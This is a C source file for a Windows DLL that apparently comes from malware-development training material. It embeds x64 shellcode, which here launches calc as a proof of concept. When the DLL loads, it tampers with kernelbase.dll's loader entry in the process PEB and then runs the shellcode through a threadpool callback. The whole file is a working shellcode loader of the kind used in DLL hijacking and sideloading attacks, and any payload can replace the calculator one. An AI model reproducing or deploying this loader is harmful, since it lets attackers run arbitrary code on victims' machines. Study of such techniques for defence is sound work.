#include <Windows.h>
#include "structs.h"

#pragma section(".text")
__declspec(allocate(".text")) const unsigned char shellcode[] = {
    0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
    0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
    0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
    0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
    0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
    0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
    0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
    0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

#define MODULE L"C:\\Windows\\System32\\kernelbase.dll"

BOOL StrCompareW(LPCWSTR szStr1, LPCWSTR szStr2) { // by @NUL0x4C | @mrd0x : MalDevAcademy 

	WCHAR lStr1[MAX_PATH];
	WCHAR lStr2[MAX_PATH];

	int len1 = lstrlenW(szStr1);
	int len2 = lstrlenW(szStr2);

	int i = 0;
	int j = 0;

	if (len1 >= MAX_PATH || len2 >= MAX_PATH) {
		return FALSE;
	}

	for (i = 0; i < len1; i++) {
		lStr1[i] = (WCHAR)tolower(szStr1[i]);
	}
	lStr1[i++] = L'\0';

	for (j = 0; j < len2; j++) {
		lStr2[j] = (WCHAR)tolower(szStr2[j]);
	}
	lStr2[j++] = L'\0';

	if (lstrcmpiW(lStr1, lStr2) == 0) {
		return TRUE;
	}

	return FALSE;
}

void RestorePEB(LPCWSTR szModuleName) {

	PROCESS_BASIC_INFORMATION	pbi				= { 0 };
	NTSTATUS					STATUS			= 0x00;
	ULONG						ulRetLength		= 0;
	PEB							Peb				= { 0 };
	SIZE_T						sBytesRead		= NULL;
	PEB_LDR_DATA				pebLdrData		= { 0 };
	SIZE_T						sBytesWritten	= NULL;

	_NtQueryInformationProcess	pNtQueryInformationProcess	= (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	_NtWriteVirtualMemory		pNtWriteVirtualMemory		= (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	_NtReadVirtualMemory		pNtReadVirtualMemory		= (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");

	if (pNtQueryInformationProcess == NULL) {
		return -1;
	}

	if ((STATUS = pNtQueryInformationProcess((HANDLE)-1, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &ulRetLength)) != 0x00){
		return -1;
	}

	// Read the PEB from the remote process
	if ((STATUS = pNtReadVirtualMemory((HANDLE)-1, pbi.PebBaseAddress, &Peb, sizeof(PEB), &sBytesWritten)) != 0x00){ 
		return -1;
	}

	if ((STATUS = pNtReadVirtualMemory((HANDLE)-1, Peb.Ldr, &pebLdrData, sizeof(PEB_LDR_DATA), &sBytesWritten)) != 0x00){
		return -1; 
	}

	// Iterate over the remote process PEB's loaded modules list
	LIST_ENTRY* pLdrListHead = &pebLdrData.InLoadOrderModuleList;
	LIST_ENTRY* pLdrCurrentModule = pLdrListHead->Flink; // Starting point

	do
	{
		LDR_DATA_TABLE_ENTRY ldrTableEntry = { 0 };
		// Adjust the pointer to get the actual LDR_DATA_TABLE_ENTRY from the list entry
		LDR_DATA_TABLE_ENTRY* ldrEntryPtr = CONTAINING_RECORD(pLdrCurrentModule, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		// Reading the module entry
		if ((STATUS = pNtReadVirtualMemory((HANDLE)-1, ldrEntryPtr, &ldrTableEntry, sizeof(LDR_DATA_TABLE_ENTRY), &sBytesWritten)) != 0x00){
			break; // Exit the loop on error
		}

		WCHAR wcFullDllName[MAX_PATH] = { 0 };
		if (ldrTableEntry.FullDllName.Length > 0) {
			if ((STATUS = pNtReadVirtualMemory((HANDLE)-1, (LPCVOID)ldrTableEntry.FullDllName.Buffer, &wcFullDllName, ldrTableEntry.FullDllName.Length, &sBytesRead)) != 0x00){
				return -1;
			}

			if (StrCompareW(wcFullDllName, szModuleName)) {
				if (ldrTableEntry.DllBase != NULL && ldrTableEntry.SizeOfImage != 0) {
					DWORD peHeaderOffset = *((DWORD*)((SIZE_T)ldrTableEntry.DllBase + 0x3C));
					PIMAGE_NT_HEADERS peHeader = (PIMAGE_NT_HEADERS)((SIZE_T)ldrTableEntry.DllBase + peHeaderOffset);
					DWORD entryPointRVA = peHeader->OptionalHeader.AddressOfEntryPoint;
					PVOID entryPointAddress = (PVOID)((SIZE_T)ldrTableEntry.DllBase + entryPointRVA);

					ldrTableEntry.EntryPoint = entryPointAddress;

					// Write the modified entry back
					if ((STATUS = pNtWriteVirtualMemory((HANDLE)-1, ldrEntryPtr, &ldrTableEntry, sizeof(LDR_DATA_TABLE_ENTRY), &sBytesWritten)) != 0x00){
						break;
					}
					break; // Sucess
				}
			}
		}
		pLdrCurrentModule = (LIST_ENTRY*)ldrTableEntry.InLoadOrderLinks.Flink;

	} while (pLdrCurrentModule != pLdrListHead && pLdrCurrentModule != NULL);

	return;
}

VOID ExecutePayload(PVOID pShellcode) {

	TP_CALLBACK_ENVIRON		tpCallbackEnv = { 0 };
	PTP_WORK				ptpWork = NULL;

	if (!pShellcode)
		return;

	InitializeThreadpoolEnvironment(&tpCallbackEnv);

	ptpWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)pShellcode, NULL, &tpCallbackEnv);
	SubmitThreadpoolWork(ptpWork);

}

void run() {
	
	RestorePEB(MODULE);
	ExecutePayload(shellcode);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		run();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

